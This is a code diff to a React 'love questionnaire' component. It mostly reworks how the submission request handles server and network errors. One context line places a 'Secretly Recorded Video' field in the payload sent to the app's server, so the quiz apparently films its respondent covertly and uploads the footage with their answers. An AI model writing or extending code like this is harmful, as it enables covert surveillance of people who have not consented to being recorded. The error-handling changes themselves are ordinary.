@@ -70,10 +70,6 @@ const LoveQuestionnaire: React.FC<LoveQuestionnaireProps> = ({
       "Secretly Recorded Video": secretVideoData ? [secretVideoData] : [],
     };
     try {
-      // Using FormData is more reliable for sending large data to some PHP servers
-      const formData = new FormData();
-      formData.append("data", JSON.stringify(data));
-
       const res = await fetch(
         "/api/send-questionnaire", // Use the Vercel serverless function
         {
@@ -82,21 +78,26 @@ const LoveQuestionnaire: React.FC<LoveQuestionnaireProps> = ({
           body: JSON.stringify(data),
         }
       );
-      const result = await res.json();
-      if (result.status === "success") {
-        setShowSuccessPopup(true);
+      if (res.ok) {
+        const result = await res.json();
+        if (result.success) {
+          setShowSuccessPopup(true);
+        } else {
+          setError(result.error || "Something went wrong on the server.");
+        }
       } else {
-        setError(result.message || "Something went wrong.");
+        const errorText = await res.text();
+        setError(`Server error: ${res.status} - ${errorText}`);
       }
     } catch (err) {
-      setError("Network error.");
+      setError("Network error. Could not reach the server.");
     }
     setSubmitting(false);
   };
 
   const handlePopupClose = () => {
     setShowSuccessPopup(false);
-    onComplete(); // Ab yahan onComplete call hoga
+    onComplete();
   };
 
   return (
